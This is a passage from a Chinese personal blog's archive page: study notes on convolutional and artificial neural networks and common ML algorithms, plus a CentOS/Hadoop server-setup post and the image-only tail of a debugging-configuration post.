<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/946hcD1fcK.png?imageslim" alt="mark"></p>
<p>看到正在下载代码。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/BgaDBa9jdm.png?imageslim" alt="mark"></p>
<h4 id="（2）配置-Debug"><a href="#（2）配置-Debug" class="headerlink" title="（2）配置 Debug"></a>（2）配置 Debug</h4><p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/0hK31AGab6.png?imageslim" alt="mark"></p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/4DImBIa2bI.png?imageslim" alt="mark"></p>
<h4 id="（2）配置-Server"><a href="#（2）配置-Server" class="headerlink" title="（2）配置 Server"></a>（2）配置 Server</h4><p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/Fi332d1jB7.png?imageslim" alt="mark"></p>
<h4 id="（5）配置调试选项-1"><a href="#（5）配置调试选项-1" class="headerlink" title="（5）配置调试选项"></a>（5）配置调试选项</h4><p>待补充。</p>
<h4 id="（6）开始调试-1"><a href="#（6）开始调试-1" class="headerlink" title="（6）开始调试"></a>（6）开始调试</h4><p>待补充。</p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-Covolutions Neural Netwrk"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/10/08/Covolutions Neural Netwrk/">Covolutions Neural Netwrk</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/10/08/Covolutions Neural Netwrk/" class="article-date">
	  <time datetime="2017-10-08T15:53:56.000Z" itemprop="datePublished">2017-10-08</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="Covolutions-Neural-Netwrk"><a href="#Covolutions-Neural-Netwrk" class="headerlink" title="Covolutions Neural Netwrk"></a>Covolutions Neural Netwrk</h3><p>​    卷积神经网络有三种层：卷积层、池化层和全连接层（Convolutional Layer, Pooling Layer, 及Fully-Connected Layer）。 </p>
<p>[INPUT - CONV - RELU -x POOL - FC]            也就是  [输入-卷积-激活-池化-分类得分</p>
<p>卷积神经网络是计算机自主学习的一种方式。（自学习） 卷积神经网络（CNN）</p>
<p>由Huabel与Wiesel在研究猫的脑皮层中用局部敏感和方法选择的神经元时发现其独特的网络结构可以有效的降低反馈神经网络的复杂性提出。</p>
<p>DCNN（Deep ConvolutionalNeural Network，深度卷积网络）与LSTM（LongShort Term Memory，长短时记忆网络）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">数据-》自学习-》结果</span><br><span class="line"></span><br><span class="line">输入-》 算法 -》输出</span><br></pre></td></tr></table></figure>
<p><strong>空间共享</strong></p>
<p>​    计算机视觉里经常使卷积神经网络，即CNN，是一种对人脑比较精准的模拟。</p>
<p>​    <strong>什么是卷积？卷积就是两个函数之间的相互关系，然后得出一个新的值，他是在连续空间做积分计算，然后在离散空间内求和的过程。实际上在计算机视觉里面，可以把卷积当做一个抽象的过程，就是把小区域内的信息统计抽象出来。</strong></p>
<p><strong>    比如，对于一张爱因斯坦的照片，我可以学习n个不同的卷积和函数，然后对这个区域进行统计。可以用不同的方法统计，比如着重统计中央，也可以着重统计周围，这就导致统计的和函数的种类多种多样，为了达到可以同时学习多个统计的累积和。</strong></p>
<p>从LeNet到AlexNet</p>
<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/1clip_image001.jpg" alt="clip_image00"></p>
<p>物体检测问题</p>
<p>Region CNN YOLO</p>
<p>FACEBOOK提出来的YOLO网络，物体检测，</p>
<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/1clip_image004.gif" alt="clipboard.png"></p>
<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/1clip_image006.gif" alt="clip_image00"></p>
<p>权重 W 与偏移量B  相同     不同的是输入的值</p>
<p>ConvNet体系结构：<strong>卷积层</strong>，<strong>池层</strong>和<strong>完全连接层</strong>（正如在常规神经网络中所见）</p>
<h3 id="ConvNet"><a href="#ConvNet" class="headerlink" title="ConvNet"></a><strong>ConvNet</strong></h3><p>C++中卷积神经网络的GPU实现</p>
<p>一个示例ConvNet架构的激活。初始卷存储原始图像像素（左），最后一个卷存储类分数（右）。沿着处理路径的每个激活量显示为一列。由于难以将3D体积可视化，因此我们将行卷切成行。最后一层卷保留每个类的分数，但在这里我们只可视化排序的前5个分数，并打印每个分数的标签。完整<a href="http://cs231n.stanford.edu/" target="_blank" rel="noopener">的基于Web的演示文稿</a>显示在我们网站的标题中。这里所示的架构是一个小型的VGG网络，稍后将讨论。</p>
<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image008.gif" alt="clipboard.png"></p>
<p>双曲正切函数是双曲函数中的一个函数。</p>
<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/1clip_image010.gif" alt="clip_image01"></p>
<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/1clip_image012.gif" alt="clip_image01"><img src="http://oizzgpxb7.bkt.clouddn.com//ml/1clip_image014.gif" alt="clip_image01"></p>
<p><strong>输入图像I。</strong>为了减小复杂度，一般使用灰度图像。当然，也可以使用RGB彩色图像，此时输入图像有三张，分别为RGB分量。输入图像一般需要归一化，1、如果使用sigmoid激活函数，则归一化到[0,1]        2、 如果使用tanh激活函数，则归一化到[-1, 1]。</p>
<p><strong>多个卷积（C）-下采样（S）层</strong>。将上一层的输出与本层权重W做卷积得到各个C层，然后下采样得到各个S层。怎么做以及为什么，下面会具体分析。这些层的输出称为FeatureMap。</p>
<p><strong>光栅化（X）</strong>。是为了与传统的多层感知器全连接。即将上一层的所有Feature Map的每个像素依次展开，排成一列。</p>
<p><strong>传统的多层感知器（N&amp;O）</strong>。最后的分类器一般使用Softmax，如果是二分类，当然也可以使用LR。</p>
<h4 id="输入层-隐层："><a href="#输入层-隐层：" class="headerlink" title="输入层-隐层："></a><strong>输入层-隐层：</strong></h4><p>是一个全连接的网络，即每个输入节点都连接到所有的隐层节点上。更详细地说，可以把输入层视为一个向量 xx ，而隐层节点 jj 有一个权值向量 θjθj 以及偏置 bjbj ，激活函数使用 <em>sigmoid</em> 或 <em>tanh</em> ，那么这个隐层节点的输出应该是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fj(x)=act(θTjx+bj)fj(x)=act(θjTx+bj)</span><br></pre></td></tr></table></figure>
<p>也就是每个隐层节点都相当于一个感知器。每个隐层节点产生一个输出，那么隐层所有节点的输出就成为一个向量，即</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f(x)=act(Θx+b)f(x)=act(Θx+b)</span><br></pre></td></tr></table></figure>
<p>若输入层有 mm 个节点，隐层有 nn 个节点，那么 Θ=[θT]Θ=[θT] 为 n×mn×m 的矩阵，xx 为长为 mm 的向量，bb 为长为 nn 的向量，激活函数作用在向量的每个分量上， f(x)f(x) 返回一个向量。</p>
<h4 id="隐层-输出层"><a href="#隐层-输出层" class="headerlink" title="隐层-输出层:"></a><strong>隐层-输出层</strong>:</h4><p>可以视为级联在隐层上的一个感知器。若为二分类，则常用LogisticRegression；若为多分类，则常用Softmax Regression。</p>
<p><strong>卷积、下采样、光栅化、多层感知器预测</strong></p>
<h5 id="卷积"><a href="#卷积" class="headerlink" title="卷积"></a>卷积</h5><p>离散卷积运算。假设有二维离散函数 f(x,y),g(x,y) ， 那么它们的卷积定义为</p>
<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/1clip_image016.gif" alt="clipboard.png"></p>
<p>从这里，可以看到卷积的重要的物理意义是：一个函数（如：单位响应）在另一个函数（如：输入信号）上的<strong>加权叠加。</strong></p>
<h5 id="下采样"><a href="#下采样" class="headerlink" title="下采样"></a>下采样</h5><p>下采样，即池化，目的是减小特征图，池化规模一般为2×2。常用的池化方法有：</p>
<p>最大池化（Max Pooling）。取4个点的最大值。这是最常用的池化方法。</p>
<p>均值池化（Mean Pooling）。取4个点的均值。</p>
<p>高斯池化。借鉴高斯模糊的方法。不常用。具体过程不是很清楚。。。</p>
<p>可训练池化。训练函数 f ，接受4个点为输入，出入1个点。不常用。</p>
<h5 id="光栅化"><a href="#光栅化" class="headerlink" title="光栅化"></a>光栅化</h5><p>图像经过池化-下采样后，得到的是一系列的特征图，而多层感知器接受的输入是一个向量。因此需要将这些特征图中的像素依次取出，排列成一个向量。具体说，对特征图 X1,X2,…,Xj ，光栅化后得到的向量</p>
<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/1clip_image018.gif" alt="clip_image01"></p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/机器学习/">机器学习</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-服务器配置"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/10/05/服务器配置/">服务器配置</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/10/05/服务器配置/" class="article-date">
	  <time datetime="2017-10-05T15:53:56.000Z" itemprop="datePublished">2017-10-05</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="服务器配置"><a href="#服务器配置" class="headerlink" title="服务器配置"></a>服务器配置</h2><p>CentOS教程 / 软件使用配置</p>
<p><a href="http://www.centoscn.com/image-text/config/" target="_blank" rel="noopener">http://www.centoscn.com/image-text/config/</a></p>
<p>CentOS 修改主机名 - Virson Ma - 博客园</p>
<p><a href="http://www.cnblogs.com/mawanglin2008/p/3530790.html" target="_blank" rel="noopener">http://www.cnblogs.com/mawanglin2008/p/3530790.html</a></p>
<p>区别 chown和chmod的用法 - 博客频道 - CSDN.NET</p>
<p><a href="http://blog.csdn.net/doupei2006/article/details/8015986" target="_blank" rel="noopener">http://blog.csdn.net/doupei2006/article/details/8015986</a></p>
<p>chown用法</p>
<p>用来更改某个目录或文件的用户名和用户组的</p>
<p>chown 用户名:组名文件路径（可以是就对路径也可以是相对路径）</p>
<p>例1：chown root:root /tmp/tmp1</p>
<p>就是把tmp下的tmp1的用户名和用户组改成root和root（只修改了tmp1的属组）.</p>
<p>例2：chown -R root:root /tmp/tmp1</p>
<p>就是把tmp下的tmp1下的所有文件的属组都改成root和root。</p>
<p>chmod用法</p>
<p>用来修改某个目录或文件的访问权限。</p>
<p>语法：chmod [who] [+ | - | =] [mode] 文件名</p>
<p> 命令中各选项的含义为： </p>
<p>操作对象who可是下述字母中的任一个或者它们的组合：</p>
<p> 　　u 表示“用户（user）”，即文件或目录的所有者。</p>
<p> 　　g 表示“同组（group）用户”，即与文件属主有相同组ID的所有用户。</p>
<p> 　　o 表示“其他（others）用户”。</p>
<p> 　　a 表示“所有（all）用户”。它是系统默认值。</p>
<p><a href="interm">Hadoop2.7.3完全分布式集群搭建和测试 - 如果一切重来 - 博客频道 - CSDN.NET</a></p>
<p><a href="http://blog.csdn.net/xiaoxiangzi222/article/details/52757168" target="_blank" rel="noopener">http://blog.csdn.net/xiaoxiangzi222/article/details/52757168</a></p>
<p>细细品味Hadoop - 随笔分类 - 虾皮 -博客园</p>
<p><a href="http://www.cnblogs.com/xia520pi/category/346943.html" target="_blank" rel="noopener">http://www.cnblogs.com/xia520pi/category/346943.html</a></p>
<p>低版本物理机部署高版本OVF 报“硬件系列vmx12不受支持“解决办法 - 搬砖笔记 - 博客频道 - CSDN.NET</p>
<p><a href="http://blog.csdn.net/xfks55/article/details/52858622" target="_blank" rel="noopener">http://blog.csdn.net/xfks55/article/details/52858622</a></p>
<p>vim /etc/sysconfig/network-scripts/ifcgf-eth0  静态地址</p>
<p> <strong>scp -r /usr/hadooproot@node1:/usr/hadoop</strong></p>
<p>Usage: hdfs [–config confdir] [–loglevel loglevel] COMMAND</p>
<p>​       where COMMAND is oneof:</p>
<p>  dfs                  run a filesystem command onthe file systems supported in Hadoop.</p>
<p>  classpath            prints the classpath</p>
<p>  namenode -format     format the DFS filesystem</p>
<p>  secondarynamenode    run the DFS secondary namenode</p>
<p>  namenode             run the DFS namenode</p>
<p>  journalnode          run the DFS journalnode</p>
<p>  zkfc                 run the ZK Failover Controllerdaemon</p>
<p>  datanode             run a DFS datanode</p>
<p>  dfsadmin             run a DFS admin client</p>
<p>  haadmin              run a DFS HA admin client</p>
<p>  fsck                 run a DFS filesystem checkingutility</p>
<p>  balancer             run a cluster balancing utility</p>
<p>  jmxget               get JMX exported values fromNameNode or DataNode.</p>
<p>  mover                run a utility to move block replicasacross</p>
<p>​                       storagetypes</p>
<p>  oiv                  apply the offline fsimageviewer to an fsimage</p>
<p>  oiv_legacy           apply the offline fsimage viewer toan legacy fsimage</p>
<p>  oev                  apply the offline editsviewer to an edits file</p>
<p>  fetchdt              fetch a delegation token from theNameNode</p>
<p>  getconf              get config values fromconfiguration</p>
<p>  groups               get the groups which usersbelong to</p>
<p>  snapshotDiff         diff two snapshots of a directory ordiff the</p>
<p>​                       currentdirectory contents with a snapshot</p>
<p>  lsSnapshottableDir   list all snapshottable dirs owned by thecurrent user</p>
<p>​                                                Use -help to see options</p>
<p>  portmap              run a portmap service</p>
<p>  nfs3                 run an NFS version 3 gateway</p>
<p>  cacheadmin           configure the HDFS cache</p>
<p>  crypto               configure HDFS encryption zones</p>
<p>  storagepolicies      list/get/set block storage policies</p>
<p>  version              print the version</p>
<p>1、关闭firewall：</p>
<p>systemctl stopfirewalld.service #停止firewall</p>
<p>systemctl disablefirewalld.service #禁止firewall开机启动</p>
<p>firewall-cmd –state #查看默认防火墙状态（关闭后显示notrunning，开启后显示running）</p>
<p>关闭selinux</p>
<p>　　<strong>2）禁用selinux</strong></p>
<p>​    编辑 “<strong>/etc/selinux/config</strong>“文件，设置”<strong>SELINUX</strong>=<strong>disabled</strong>“</p>
<p><strong>nano slave</strong></p>
<p><strong>bin/hdfs namenode -**</strong>format sbin/start-all.sh**</p>
<p>hdfs  dfsadmin -report </p>
<p>yum installjava-1.7.0-openjdk-devel.x86_64  安装jps</p>
<p>Hadoop 启动节点Datanode失败解决_服务器应用_Linux公社-Linux系统门户网站</p>
<p><a href="http://www.linuxidc.com/Linux/2014-11/108822.htm" target="_blank" rel="noopener">http://www.linuxidc.com/Linux/2014-11/108822.htm</a></p>
<p>先格式化再启动</p>
<p>出现该问题的原因：在第一次格式化dfs后，启动并使用了hadoop，后来又重新执行了格式化命令（hdfs namenode -format)，这时namenode的clusterID会重新生成，而datanode的clusterID 保持不变。</p>
<p>删除初始文件</p>
<p>hadoop集群只有一个datanode启动问题 - yijichangkong的专栏 - 博客频道 - CSDN.NET</p>
<p><a href="http://blog.csdn.net/yijichangkong/article/details/45438931" target="_blank" rel="noopener">http://blog.csdn.net/yijichangkong/article/details/45438931</a></p>
<p>onlyoffice/documentserver - Docker Hub</p>
<p><a href="https://hub.docker.com/r/onlyoffice/documentserver/" target="_blank" rel="noopener">https://hub.docker.com/r/onlyoffice/documentserver/</a></p>
<p>快速入门指南</p>
<p><a href="http://docs.rancher.com/rancher/v1.5/en/quick-start-guide/" target="_blank" rel="noopener">http://docs.rancher.com/rancher/v1.5/en/quick-start-guide/</a></p>
<p><a href="http://mattermost.org/" target="_blank" rel="noopener">最重要的</a> - 开源的，首选的Slack-alternative</p>
<p><a href="https://bitnami.com/" target="_blank" rel="noopener">https://bitnami.com/</a></p>
<p><a href="https://www.nagios.org/" target="_blank" rel="noopener">https://www.nagios.org/</a></p>
<p><a href="http://wiki.pentaho.com/display/COM/Community+Wiki+Home" target="_blank" rel="noopener">http://wiki.pentaho.com/display/COM/Community+Wiki+Home</a></p>
<p><a href="https://bitnami.com/stacks/project-management" target="_blank" rel="noopener">https://bitnami.com/stacks/project-management</a></p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/运维/">运维</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-人工神经网络"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/10/05/人工神经网络/">人工神经网络</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/10/05/人工神经网络/" class="article-date">
	  <time datetime="2017-10-05T15:53:56.000Z" itemprop="datePublished">2017-10-05</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="人工神经网络"><a href="#人工神经网络" class="headerlink" title="人工神经网络"></a>人工神经网络</h2><p><strong>人工神经网络最重要的是 :   分类</strong></p>
<p>神经网络分类： </p>
<ol>
<li><p>ANN（人工神经网络）</p>
</li>
<li><p>LSTM （循环神经网络）  时间共享</p>
</li>
<li><p>CNN（卷积神经网络）空间共享</p>
<p>基本流程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分类样本--》训练样本--》建模--》测试样本--》结果</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>参考：<a href="https://www.zhihu.com/question/22553761" target="_blank" rel="noopener">https://www.zhihu.com/question/22553761</a></p>
<h4 id="空间切一刀-某种激活函数-0-1阶跃、sigmoid、-sigmoid-（或者-tanh-）-但是可以一层一层级联"><a href="#空间切一刀-某种激活函数-0-1阶跃、sigmoid、-sigmoid-（或者-tanh-）-但是可以一层一层级联" class="headerlink" title="空间切一刀  +   某种激活函数(0-1阶跃、sigmoid、, sigmoid （或者 tanh ）),  但是可以一层一层级联"></a>空间切一刀  +   某种激活函数(0-1阶跃、sigmoid、, <em>sigmoid</em> （或者 <em>tanh</em> ）),  但是可以一层一层级联</h4><p>​      这一层是下一层的输入。       </p>
<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image002.gif" alt="clipboard.png"></p>
<p>​    类似于人类大脑的神经元之间能够不断的调节连接强度从而达到不断的训练与学习的目的，人工神经网络同样可以做到不断的调整输入连接上的权值使得该神经网络能够更加的适应训练集合。</p>
<p>​    在人工神经网络方法学习训练的过程当中，学习样本的特征向量被传递进输入端作为输入的数据，分类结果作为学习样本的输出，也是整个网络的输出；然后，人工神经网络将会根据上一步的样本输出调节输入的权值 w，使得训练之后的误差逐步减小。通过不断的训练与调整的过程，使得训练样本的实际输出越来越接近于真实目标。</p>
<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image004.gif" alt="clipboard.png"></p>
<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image006.gif" alt="clipboard.png"></p>
<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image008.gif" alt="clipboard.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">其中函数 f（）称为非线性激活函数，激活函数根据实际应用确定，调整权值。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">反向传播算法  ：  结果反向决定输入，不断调整权值，</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">常用激活  函数  ：  logistic   Sigmoid    sign , tanh</span><br></pre></td></tr></table></figure>
<h4 id="感知机："><a href="#感知机：" class="headerlink" title="感知机："></a>感知机：</h4><p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image010.gif" alt="clipboard.png"></p>
<p>其中激活函数 <em>act</em> 可以使用{<em>sign, sigmoid, tanh</em>}之一。</p>
<p>l 激活函数使用符号函数 <em>sign</em> ，可求解损失函数最小化问题，通过梯度下降确定参数</p>
<p>l 激活函数使用 <em>sigmoid</em> （或者 <em>tanh</em> ），则分类器事实上成为Logistic Regression，可通过梯度上升极大化似然函数，或者梯度下降极小化损失函数，来确定参数</p>
<p>l 如果需要多分类，则事实上成为SoftmaxRegression</p>
<p>l 如要需要分离超平面恰好位于正例和负例的正中央，则成为支持向量机（SVM）。</p>
<h4 id="多层感知器"><a href="#多层感知器" class="headerlink" title="多层感知器"></a>多层感知器</h4><p>感知器存在的问题是，对线性可分数据工作良好，如果设定迭代次数上限，则也能一定程度上处理近似线性可分数据。但是对于非线性可分的数据，比如最简单的异或问题，感知器就无能为力了。这时候就需要引入多层感知器这个大杀器。</p>
<p>多层感知器的思路是，尽管原始数据是非线性可分的，但是可以通过某种方法将其映射到一个线性可分的高维空间中，从而使用线性分类器完成分类。图1中，从X到O这几层，正展示了多层感知器的一个典型结构，即输入层-隐层-输出层。</p>
<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image012.gif" alt="clipboard.png"></p>
<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image014.gif" alt="clipboard.png"></p>
<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image016.gif" alt="clipboard.png"></p>
<h3 id="logistic-函数"><a href="#logistic-函数" class="headerlink" title="logistic   函数"></a>logistic   函数</h3><h5 id="非对称："><a href="#非对称：" class="headerlink" title="非对称："></a>非对称：</h5><p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image018.gif" alt="clipboard.png"></p>
<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image020.gif" alt="clipboard.png"></p>
<h5 id="对称："><a href="#对称：" class="headerlink" title="对称："></a>对称：</h5><p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image022.gif" alt="clipboard.png"></p>
<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image024.gif" alt="clipboard.png"></p>
<h3 id="反馈神经网络-BP神经网络"><a href="#反馈神经网络-BP神经网络" class="headerlink" title="反馈神经网络  BP神经网络"></a>反馈神经网络  BP神经网络</h3><p>Hebb改变权重上个神经元进行调整 。学习是一类相关学习，算法的基本思想是：如果有两个神经元同时兴奋，则它们之间的连接强度的增强与它们的激励的乘积成正比</p>
<p>在Hebb学习规则中，学习信号简单地等于神经元的输出：</p>
<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image026.gif" alt="clipboard.png"></p>
<p>用yi(k)表示单元i 在k 时刻的激活值（输出），yj (k)表示单元j在 k 时刻的激活值，wij(k)表示单元i到单元j的连接权值，则Hebb学习规则可表示如下：</p>
<p>∆Wij(k)=Wij(k+1)-Wij(k)=η<em>yi(k)</em>yj(k+1),式中η为学习速率</p>
<p><strong>权值调整量与输入输出的乘积成正比。</strong></p>
<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image028.gif" alt="clipboard.png"></p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/机器学习/">机器学习</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-机器学习重要算法"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/10/01/机器学习重要算法/">机器学习重要算法</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/10/01/机器学习重要算法/" class="article-date">
	  <time datetime="2017-10-01T15:53:56.000Z" itemprop="datePublished">2017-10-01</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="机器学习重要算法"><a href="#机器学习重要算法" class="headerlink" title="机器学习重要算法"></a>机器学习重要算法</h1><p>监督学习和非监督学习。</p>
<p>监督学习： 分类和回归；</p>
<p>监督学习： 聚类算法，密度估计算法。</p>
<h2 id="分类-需已知样本特征"><a href="#分类-需已知样本特征" class="headerlink" title="分类 :需已知样本特征"></a>分类 :需已知样本特征</h2><ul>
<li><strong>Classification (分类)</strong>，一个 classifier 会从它得到的训练集中进行“学习”，从而具备对未知数据进行分类的能力，这种提供训练数据的过程通常叫做 supervised learning (监督学习)（样本有标签），</li>
<li>所谓分类，简单来说，就是根据文本的特征或属性，划分到已有的类别中。如在自然语言处理NLP中，我们经常提到的文本分类便就是一个分类问题，一般的模式分类方法都可用于文本分类研究。<ul>
<li>常用的分类算法包括：<ul>
<li>k-最近邻法(k-nearest neighbor，kNN)，</li>
<li>决策树分类法，</li>
<li>朴素的贝叶斯分类算法(native Bayesian classifier)(NBC)、</li>
<li>基于支持向量机(SVM)的分类器，</li>
<li>神经网络法(SNN)，  神经网络（CNN)</li>
<li>模糊分类法等等</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>分类作为一种监督学习方法，要求必须事先明确知道各个类别的信息，并且断言所有待分类项都有一个类别与之对应。但是很多时候上述条件得不到满足，尤其是在处理海量数据的时候，如果通过预处理使得数据满足分类算法的要求，则代价非常大，这时候可以考虑使用聚类算法。</p>
<h2 id="聚类：把相似的对象聚合"><a href="#聚类：把相似的对象聚合" class="headerlink" title="聚类：把相似的对象聚合"></a>聚类：把相似的对象聚合</h2><ul>
<li><strong>Clustering(聚类)</strong>，简单地说就是把<strong>相似</strong>的东西分到一组，聚类的时候，我们并不关心某一类是什么，我们需要实现的目标只是把相似的东西聚到一起，因此，一个聚类算法通常只需要知道如何计算相似 度就可以开始工作了，因此 clustering 通常并不需要使用训练数据进行学习，这在 Machine Learning 中被称作 unsupervised learning (无监督学习).</li>
</ul>
<p>聚类分析指将物理或抽象对象的集合分组为由类似的对象组成的多个类的分析过程。</p>
<ul>
<li>常用的分类算法包括：<ul>
<li>而<strong>K均值</strong>(K-meansclustering)聚类则是最典型的聚类算法</li>
<li>除此之外，还有很多诸如 属于划分法K-MEDOIDS算法、CLARANS算法；属于层次法的BIRCH算法、CURE算法、CHAMELEON算法等；基于密度的方法：DBSCAN算法、OPTICS算法、DENCLUE算法等；基于网格的方法：STING算法、CLIQUE算法、WAVE-CLUSTER算法；基于模型的方法，本系列后续会介绍其中几种。</li>
</ul>
</li>
</ul>
<p>参考大神博客：<a href="http://blog.csdn.net/v_july_v/article/details/7577684" target="_blank" rel="noopener">http://blog.csdn.net/v_july_v/article/details/7577684</a></p>
<h1 id="分类算法"><a href="#分类算法" class="headerlink" title="分类算法"></a>分类算法</h1><h2 id="kNN-K-邻近算法"><a href="#kNN-K-邻近算法" class="headerlink" title="kNN K-邻近算法"></a>kNN K-邻近算法</h2><p>采用测量不同特征值之间的距离方法。进行分类。<br><strong>目标样本</strong>与<strong>存在标签的样本集</strong>作<strong>对比</strong>。 取前K个最为相似的数据，选择K最多的目标的新分类。</p>
<p>给定训练数据样本和标签，对于某测试的一个样本数据，选择距离其最近的k个训练样本，这k个训练样本中所属类别最多的类即为该测试样本的预测标签。简称kNN。</p>
<p>通常k是不大于20的整数，这里的距离一般是欧式距离。</p>
<h3 id="一般流程"><a href="#一般流程" class="headerlink" title="一般流程"></a>一般流程</h3><ol>
<li>收集数据（距离计算所需要的数值，最好是结构化的数据格式）</li>
<li>分析数据：可以使用任何方法</li>
<li>训练算法：此步骤不适合K-邻近算法</li>
<li>测试算法：计算错误率</li>
<li>使用算法：输入样本数据+结构化输出结果 —》然后运行k-近邻算法判定输入数据属于哪个分类-=-》最后应用对计算出的分类执行后续操作。</li>
</ol>
<h2 id="决策树"><a href="#决策树" class="headerlink" title="决策树"></a>决策树</h2><p>决策树学习采用的是自顶向下的递归方法，其基本思想是以信息熵为度量构造一棵熵值下降最快的树，到叶子节点处的熵值为零，此时每个叶节点中的实例都属于同一类。<br>以树的形式划分数据集(ID3算法)。</p>
<h3 id="一般流程-1"><a href="#一般流程-1" class="headerlink" title="一般流程"></a>一般流程</h3><ol>
<li>收集数据(树构造算法只适用于标称型数据、数据必须离散化)</li>
<li>分析数据：检查图形是否符合规范</li>
<li>训练算法:构造<strong>树</strong>的<strong>数据结构</strong>(ID3算法等等)</li>
<li>测试算法：使用经验树计算错误率</li>
<li>使用算法:此步骤可以适用于任何监督学习算法，而使用决策树可以更好的理解数据的内在含义。</li>
</ol>
<h2 id="朴素贝叶斯"><a href="#朴素贝叶斯" class="headerlink" title="朴素贝叶斯"></a>朴素贝叶斯</h2><p>在给定目标值时属性之间相互条件独立的前提下，贝叶斯决策理论的核心思想：即选择具有最高概率的决策。 （基于条件概率）</p>
<h3 id="一般流程-2"><a href="#一般流程-2" class="headerlink" title="一般流程"></a>一般流程</h3><ol>
<li>收集数据（需要数值型或者布尔型）</li>
<li>分析数据</li>
<li>训练算法：计算不同的独立特征的<strong>条件概率</strong></li>
<li>测试算法：计算错误率</li>
<li>使用算法：文档分类居多</li>
</ol>
<h1 id="回归（预测）"><a href="#回归（预测）" class="headerlink" title="回归（预测）"></a>回归（预测）</h1><h2 id="Logistic-回归"><a href="#Logistic-回归" class="headerlink" title="Logistic 回归"></a>Logistic 回归</h2><p>最优化算法。 logistic函数<br>根据现有的数据对于分类边界线建立回归公式。<br>参考：<a href="https://www.zhihu.com/question/36714044?sort=created" target="_blank" rel="noopener">https://www.zhihu.com/question/36714044?sort=created</a></p>
<h3 id="一般流程-3"><a href="#一般流程-3" class="headerlink" title="一般流程"></a>一般流程</h3><ol>
